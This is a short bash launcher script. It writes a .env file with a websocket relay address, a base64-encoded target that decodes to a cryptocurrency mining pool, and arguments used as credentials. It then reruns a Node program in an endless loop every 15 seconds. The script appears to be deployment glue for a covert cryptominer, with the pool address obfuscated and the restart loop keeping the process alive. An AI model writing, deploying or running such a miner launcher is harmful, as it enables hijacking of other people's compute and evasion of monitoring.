#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://cloudnineone.my.id
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=1858704322
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
